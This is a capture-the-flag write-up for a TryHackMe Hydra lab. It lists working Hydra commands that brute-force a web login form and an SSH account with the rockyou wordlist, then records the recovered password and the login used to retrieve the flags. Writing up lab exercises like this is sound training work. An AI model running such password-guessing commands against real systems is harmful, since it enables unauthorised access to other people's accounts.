# Hydra
+ Link: https://tryhackme.com/r/room/hydra
+ Target IP Address: 10.10.50.153

## Tools
+ Hydra

## External Resources
+ https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/

## Task 1
1. Went to http://10.10.50.153 and looked at the source code. Found it uses the POST method.
2. `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.50.153 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V` to find the web form password.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room03/Screenshots/1.png)
  
3. Logged into the website using the given username and the hydra-ed password to find the flag.
4. `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.50.153 -t 4 ssh` to find the SSH password.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room03/Screenshots/2.png)
  
5. `ssh molly@10.10.50.153` with password butterfly.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room03/Screenshots/3.png)
  
6. `ls` and `cat <file name>` to display the flag.

## Learend
+ Generally, don't use `-V` in Hydra, because it makes the output less readable.